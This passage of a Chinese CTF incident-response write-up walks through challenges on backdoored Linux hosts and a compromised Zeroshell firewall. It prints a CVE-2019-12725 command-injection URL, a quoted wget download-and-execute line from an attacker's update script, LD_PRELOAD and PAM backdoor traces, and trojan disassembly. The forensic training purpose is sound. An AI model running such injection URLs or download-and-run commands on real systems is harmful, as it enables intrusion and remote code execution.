</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:58:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1736<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 05:59:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1739<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 06:00:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1769<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 06:01:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1771<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 06:02:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1779<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 06:03:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1781<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 06:04:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1792<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 06:05:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1796<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 06:06:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1798<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 06:07:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1800<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 06:08:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1802<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 06:09:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1807<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 06:10:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1809<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 06:11:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1816<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                                                <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Mar <span style=color:#ae81ff>10</span> 06:12:01 ip-10-0-10-10 CRON<span style=color:#f92672>[</span>1841<span style=color:#f92672>]</span>: <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> CMD <span style=color:#f92672>(</span>echo flag<span style=color:#f92672>{</span>cr0nt4b_IRfind<span style=color:#f92672>}</span>;^Mno crontab <span style=color:#66d9ef>for</span> root
</span></span><span style=display:flex><span>                                                         
</span></span></code></pre></div><h2 id=q9-2>Q9</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>9、黑客3s做了一个root用户执行cat命令就删除文件的操作，请发现删除了什么文件将文件名作为flag提交
</span></span></code></pre></div><p><code>root/.bashrc</code> 是 root 用户的配置文件，只有 root 用户可以编辑或查看。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-10:~# cat /root/.bashrc
</span></span><span style=display:flex><span><span style=color:#75715e># ~/.bashrc: executed by bash(1) for non-login shells.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Note: PS1 and umask are already set in /etc/profile. You should not</span>
</span></span><span style=display:flex><span><span style=color:#75715e># need this unless you want different defaults for root.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># PS1=&#39;${debian_chroot:+($debian_chroot)}\h:\w\$ &#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># umask 022</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># You may uncomment the following lines if you want `ls&#39; to be colorized:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># export LS_OPTIONS=&#39;--color=auto&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># eval &#34;`dircolors`&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># alias ls=&#39;ls $LS_OPTIONS&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># alias ll=&#39;ls $LS_OPTIONS -l&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># alias l=&#39;ls $LS_OPTIONS -lA&#39;</span>
</span></span><span style=display:flex><span>export LD_PRELOAD<span style=color:#f92672>=</span>/home/user/Nomal.so
</span></span><span style=display:flex><span><span style=color:#75715e># Some more alias to avoid making mistakes:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># alias rm=&#39;rm -i&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># alias cp=&#39;cp -i&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># alias mv=&#39;mv -i&#39;</span>
</span></span></code></pre></div><p>下载下来反编译看看</p><p><img alt=2025-03-10181914 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-10181914.png></p><pre tabindex=0><code>flag{.bash_history}
</code></pre><h2 id=q10-2>Q10</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>10、黑客3s很执着清理痕迹，并做了一个持续删痕迹的手段，请发现手段并给出删除的完整黑客删除命令的md5，如flag{md5(rm -f /var/log/ssh.log &gt;/dev/stdout)}
</span></span></code></pre></div><p>直接参考q9</p><pre tabindex=0><code>b0f531b39d88d4f603fc89bd4dd2c0aa
</code></pre><h2 id=q11-1>Q11</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>11、黑客3s设置了一个万能密码后门使得这一个万能密码可以以所有用户身份登陆，也不影响原来密码使用。请发现这个万能密码，提交flag格式为flag{万能密码}
</span></span></code></pre></div><p>攻击者可能篡改了 <code>pam_unix.so</code> 文件</p><p><code>pam_unix.so</code> 是 Linux 系统中用于身份验证的核心 PAM（Pluggable Authentication Modules）模块。篡改该文件可能导致攻击者绕过身份验证、获取 root 权限或窃取用户密码。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find / -name <span style=color:#e6db74>&#34;pam_unix.so&#34;</span>
</span></span><span style=display:flex><span>/usr/lib/x86_64-linux-gnu/security/pam_unix.so
</span></span></code></pre></div><p><img alt=2025-03-10183408 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-10183408.png></p><pre tabindex=0><code>flag{ATMB6666}
</code></pre><h1 id=2024长城杯ciscn-威胁流量分析-zeroshell>2024长城杯&amp;CISCN-威胁流量分析-zeroshell</h1><h2 id=q1-22>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>1.从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag, 结果提交形式：flag{xxxxxxxxx}
</span></span></code></pre></div><pre tabindex=0><code>http contains &#34;exec&#34;
</code></pre><p><img alt=2025-03-10200649 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-10200649.png></p><h2 id=q2-22>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>2.通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容，结果提交形式：flag{xxxxxxxxxx}
</span></span></code></pre></div><p>按照docx流程进行配置，访问</p><pre tabindex=0><code>http://61.139.2.100/
</code></pre><p><a href=https://zhuanlan.zhihu.com/p/630496065>zeroshell防火墙存在远程命令执行漏洞CVE-2019-12725 - 知乎</a></p><p>cve直接打</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://61.139.2.100/cgi-bin/kerbynet?Action<span style=color:#f92672>=</span>x509view&amp;Section<span style=color:#f92672>=</span>NoAuthREQ&amp;User<span style=color:#f92672>=</span>&amp;x509type<span style=color:#f92672>=</span>%27%0Afind / -name flag%0A%27
</span></span></code></pre></div><p>先找一下文件在哪</p><pre tabindex=0><code>/DB/_DB.001/flag
</code></pre><p>然后读取就行</p><pre tabindex=0><code>flag{c6045425-6e6e-41d0-be09-95682a4f65c4}
</code></pre><h2 id=q3-22>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>3.找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag{xxxx}，如flag{www.abc.com} 或 flag{16.122.33.44}
</span></span></code></pre></div><p>执行<code>netstat -antlp</code>，搜索bash</p><pre tabindex=0><code>flag{202.115.89.103}
</code></pre><h2 id=q4-19>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>4.请写出木马进程执行的本体文件的名称，结果提交形式：flag{xxxxx}，仅写文件名不加路径
</span></span></code></pre></div><p>在linux每个运行中的进程在/proc下都有一个对应的目录，名称为进程ID。这些目录包含了多个文件和子目录，记录了进程的状态、资源使用等信息</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://61.139.2.100/cgi-bin/kerbynet?Action<span style=color:#f92672>=</span>x509view&amp;Section<span style=color:#f92672>=</span>NoAuthREQ&amp;User<span style=color:#f92672>=</span>&amp;x509type<span style=color:#f92672>=</span>%27%0Als /tmp -al%0A%27
</span></span></code></pre></div><p>.隐藏恶意文件，在几个目录下寻找后，最终在/tmp下找到.nginx查看内容是elf开头合理怀疑</p><pre tabindex=0><code>flag{.nginx}
</code></pre><h2 id=q5-15>Q5</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>5.请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式：flag{xxxx}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>xxd  -p /tmp/.nginx
</span></span></code></pre></div><p>文件比较大，不太好直接提取，可以直接挂载提取文件,ida分析一会可以找到</p><pre tabindex=0><code>11223344qweasdzxc
</code></pre><h2 id=q6-7>Q6</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>6.请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式：flag{xxxx}，如flag{/a/b/c}
</span></span></code></pre></div><p><img alt=2025-03-10211037 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-10211037.png></p><pre tabindex=0><code>flag{/var/register/system/startup/scripts/nat/File}
</code></pre><hr><h1 id=第二届长城杯ciscn半决赛-应急响应>第二届长城杯&amp;CISCN半决赛-应急响应</h1><p>看着巨魔师傅的wp浮现一下，比赛的时候由于没有取证工具，只负责了渗透部分</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>小路是一名网络安全网管，据反映发现公司主机上有异常外联信息，据回忆前段时间执行过某些更新脚本（已删除），现在需要协助小路同学进行网络安全应急响应分析，查找木马，进一步分析，寻找攻击源头，获取攻击者主机权限获取 flag 文件。
</span></span></code></pre></div><h2 id=q1-23>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>1、找出主机上木马回连的主控端服务器IP地址[不定时(3~5分钟)周期性]，并以flag{MD5}形式提交，其中MD5加密目标的原始字符串格式IP:port。
</span></span></code></pre></div><p>食用R-studio加载</p><p><img alt=2025-03-19103214 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-19103214.png></p><p>root下没有其他东西，在home下存在ubuntu的用户</p><p><img alt=2025-03-19103345 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-19103345.png></p><p>看一下里面的文件，里面的1.txt的内容是</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wget –quiet http://mirror.unknownrepo.net/f/l/a/g/system_upgrade -O /tmp/.system_upgrade <span style=color:#f92672>&amp;&amp;</span> chmod +x /tmp/.system_upgrade <span style=color:#f92672>&amp;&amp;</span> /tmp/.system_upgrade
</span></span></code></pre></div><p>通过wget镜像下载了东西保存在tmp下</p><p><code>.viminfo</code> 文件是 Vim 编辑器用来存储用户会话信息的文件，目的是在多次会话之间保留用户的操作历史和相关状态。</p><p><img alt=2025-03-19103741 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-19103741.png></p><p>去对应位置查看一下内容</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ubuntu@ip-10-0-10-7:~$ cat /etc/systemd/system/system-upgrade.service
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Unit<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Description<span style=color:#f92672>=</span>system-upgrade
</span></span><span style=display:flex><span>After<span style=color:#f92672>=</span>multi-user.target
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Service<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Type<span style=color:#f92672>=</span>forking
</span></span><span style=display:flex><span>ExecStart<span style=color:#f92672>=</span>/sbin/insmod /lib/modules/5.4.0-84-generic/kernel/drivers/system/system-upgrade.ko
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Install<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>WantedBy<span style=color:#f92672>=</span>multi-user.target
</span></span></code></pre></div><p><img alt=2025-03-19104445 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-19104445.png></p><p>找到文件进行恢复读取</p><p><img alt=2025-03-19105110 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-19105110.png></p><p>混淆过多，做题流程可以先f12看一下string快速定位具体位置</p><pre tabindex=0><code>192.168.57.203:4948
</code></pre><pre tabindex=0><code>flag{59110F555B5E5CD0A8713A447B082D63}
</code></pre><h2 id=q2-23>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>2、找出主机上驻留的远控木马文件本体，计算该文件的MD5, 结果提交形式： flag{md5}
</span></span></code></pre></div><p>定位到 <code>systemd-agentd</code> 位于 <code>/lib/systemd/systemd-agentd</code>，往下翻</p><p><img alt=2025-03-19105406 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-19105406.png></p><p><img alt=2025-03-19105536 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-19105536.png></p><pre tabindex=0><code>ubuntu@ip-10-0-10-7:~$ md5sum /lib/systemd/systemd-agentd
bccad26b665ca175cd02aca2903d8b1e  /lib/systemd/systemd-agentd
</code></pre><h2 id=q3-23>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>3、找出主机上加载远控木马的持久化程序（下载者），其功能为下载并执行远控木马，计算该文件的MD5, 结果提交形式：flag{MD5}。
</span></span></code></pre></div><p>直接定位第一题的目录读取就行</p><pre tabindex=0><code>ubuntu@ip-10-0-10-7:~$ md5sum /lib/modules/5.4.0-84-generic/kernel/drivers/system/system-upgrade.ko
78edba7cbd107eb6e3d2f90f5eca734e  /lib/modules/5.4.0-84-generic/kernel/drivers/system/system-upgrade.ko
</code></pre><h2 id=q4-20>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>4、查找题目3中持久化程序（下载者）的植入痕迹，计算持久化程序植入时的原始名称MD5（仅计算文件名称字符串MD5），并提交对应flag{MD5}。
</span></span></code></pre></div><p>也是回溯到第一题的1.txt的数据</p><p><img alt=2025-03-19111343 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-19111343.png></p><h2 id=q5-16>Q5</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>分析题目 2 中找到的远控木马，获取木马通信加密密钥, 结果提交形式：flag{通信加密密钥}
</span></span></code></pre></div><p>把文件恢复到本地ida看一下，有<code>proc/self/exe</code>跟进一下</p><p><img alt=2025-03-19110113 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-19110113.png></p><pre tabindex=0><code>.rodata:00000000004BEFC0 a127001         db &#39;127.0.0.1&#39;,0        ; DATA XREF: sub_405D33+41↑o
.rodata:00000000004BEFCA a2D             db &#39;2 %d&#39;,0Ah,0         ; DATA XREF: sub_405D33+8C↑o
.rodata:00000000004BEFD0 ; const char path[]
.rodata:00000000004BEFD0 path            db &#39;/proc/self/exe&#39;,0   ; DATA XREF: sub_405E44+2D↑o
.rodata:00000000004BEFD0                                         ; sub_4A2720+9↑o
.rodata:00000000004BEFDF aUnknown        db &#39;unknown &#39;,0Ah,0     ; DATA XREF: sub_4060F5:loc_4062BC↑o
.rodata:00000000004BEFE9 aOk             db &#39;OK&#39;,0               ; DATA XREF: sub_406339+C1↑o
.rodata:00000000004BEFEC aLocalhost      db &#39;localhost&#39;,0        ; DATA XREF: sub_40641D+1D↑o
.rodata:00000000004BEFF6 aSPC            db &#39;s:p:c:&#39;,0           ; DATA XREF: sub_40641D:loc_406465↑o
.rodata:00000000004BEFF6                                         ; sub_468A40+207↑o ...
.rodata:00000000004BEFFD unk_4BEFFD      db  3Dh ; =             ; DATA XREF: .data:off_6EB168↓o
.rodata:00000000004BEFFE                 db    1
.rodata:00000000004BEFFF                 db  20h
.rodata:00000000004BF000                 db  3Ah ; :
.rodata:00000000004BF001                 db  36h ; 6
.rodata:00000000004BF002                 db  58h ; X
.rodata:00000000004BF003                 db  3Ah ; :
.rodata:00000000004BF004                 db  36h ; 6
.rodata:00000000004BF005                 db  1Dh
.rodata:00000000004BF006                 db    1
.rodata:00000000004BF007                 db  5Ah ; Z
.rodata:00000000004BF008                 db  36h ; 6
.rodata:00000000004BF009                 db  3Ah ; :
.rodata:00000000004BF00A                 db  5Ah ; Z
.rodata:00000000004BF00B                 db  0Ah
.rodata:00000000004BF00C                 db  3Bh ; ;
.rodata:00000000004BF00D                 db  5Ah ; Z
.rodata:00000000004BF00E                 db  1Dh
.rodata:00000000004BF00F                 db  36h ; 6
.rodata:00000000004BF010                 db  0Fh
.rodata:00000000004BF011                 db    5
.rodata:00000000004BF012                 db  29h ; )
.rodata:00000000004BF013                 db  0Eh
.rodata:00000000004BF014                 db    0
.rodata:00000000004BF015                 db    0
.rodata:00000000004BF016                 db    0
.rodata:00000000004BF017                 db    0
.rodata:00000000004BF018 aTheFutexFacili db &#39;The futex facility returned an unexpected error code.&#39;,0
.rodata:00000000004BF018                                         ; DATA XREF: sub_406680:loc_406778↑o
.rodata:00000000004BF018                                         ; sub_407040:loc_407225↑o ...
.rodata:00000000004BF04E                 align 10h
.rodata:00000000004BF050 aSysdepsUnixSys db &#39;../sysdeps/unix/sysv/linux/createthread.c&#39;,0
.rodata:00000000004BF050                                         ; DATA XREF: sub_407DD0+FDD↑o
.rodata:00000000004BF050                                         ; sub_407DD0+1086↑o
.rodata:00000000004BF07A                 align 20h
.rodata:00000000004BF080 aCreateThread   db &#39;create_thread&#39;,0    ; DATA XREF: sub_407DD0:loc_408DA6↑o
.rodata:00000000004BF080                                         ; sub_407DD0+107F↑o
.rodata:00000000004BF08E                 align 10h
</code></pre><p>定位一下40641D</p><pre tabindex=0><code>__int64 __fastcall sub_40641D(unsigned int a1, __int64 a2)
{
  int v2; // eax
  const char *v3; // rax
  int v4; // eax
  unsigned int v5; // edx
  __int64 result; // rax
  unsigned int i; // ebx
  int v8; // eax
  int v9; // ebx
  int v10; // ebp
  __int64 v11; // rax
  __int64 v12; // [rsp+8h] [rbp-40h] BYREF
  struct sockaddr uservaddr; // [rsp+10h] [rbp-38h] BYREF
  unsigned __int64 v14; // [rsp+28h] [rbp-20h]

  v14 = __readfsqword(0x28u);
  while ( 1 )
  {
    v2 = sub_457BC0(a1, a2, &#34;s:p:c:&#34;);
    if ( v2 == -1 )
      break;
    switch ( v2 )
    {
      case &#39;p&#39;:
        word_6EB160 = sub_41A7A0(qword_6F62B0, 0LL, 10LL);
        if ( !word_6EB160 )
          sub_41A450(1LL);
        break;
      case &#39;s&#39;:
        off_6EB168 = (void *)qword_6F62B0;
        break;
      case &#39;c&#39;:
        v3 = (const char *)qword_6F62B0;
        if ( !qword_6F62B0 )
          v3 = &#34;localhost&#34;;
        qword_6ED5F0 = (__int64)v3;
        break;
      default:
        sub_41A450(1LL);
    }
  }
  sub_405EC9();
  v4 = sub_455A40();
  if ( v4 &lt; 0 )
  {
    v5 = 1;
  }
  else
  {
    v5 = 0;
    if ( v4 )
      goto LABEL_15;
    if ( (int)sub_455F60(a1, a2, 0LL) &lt; 0 )
    {
      v5 = 2;
    }
    else
    {
      for ( i = 0; i != 1024; ++i )
        sub_40AEC0(i);
      v8 = sub_407DD0(&amp;v12, 0LL, sub_405D33, 0LL);
      v5 = 1;
      if ( !v8 )
      {
        sub_408ED0(v12, 0LL, 1LL);
        if ( qword_6ED5F0 )
        {
          while ( 1 )
          {
            while ( 1 )
            {
              v9 = sub_405F03(0LL, 120LL);
              sub_455910(5LL);
              v10 = sub_45ADD0(2LL, 1LL, 0LL);
              if ( v10 &gt;= 0 )
              {
                v11 = sub_45B370(qword_6ED5F0);
                if ( v11 )
                  break;
              }
LABEL_23:
              sub_455910((unsigned int)(v9 + 360));
            }
            sub_45B360(&amp;uservaddr.sa_data[2], **(_QWORD **)(v11 + 24), *(int *)(v11 + 20), 12LL);
            uservaddr.sa_family = 2;
            *(_WORD *)uservaddr.sa_data = __ROR2__(word_6EB160, 8);
            if ( (int)sub_40AF70(v10, &amp;uservaddr, 16) &gt;= 0 )
            {
              sub_406339((unsigned int)v10);
              goto LABEL_23;
            }
            sub_40AEC0(v10);
            sub_455910((unsigned int)(v9 + 360));
          }
        }
        v5 = 13;
      }
    }
  }
LABEL_15:
  result = v5;
  if ( __readfsqword(0x28u) != v14 )
    sub_45B2B0();
  return result;
}
</code></pre><p>跟进一下405EC9</p><pre tabindex=0><code>_BYTE *sub_405EC9()
{
  _BYTE *result; // rax
  _BYTE *v1; // rsi
  __int64 i; // rdx

  result = (_BYTE *)sub_42C200(24LL);
  v1 = off_6EB168;
  for ( i = 0LL; i != 23; ++i )
    result[i] = v1[i] ^ 0x69;
  off_6EB168 = result;
  return result;
}
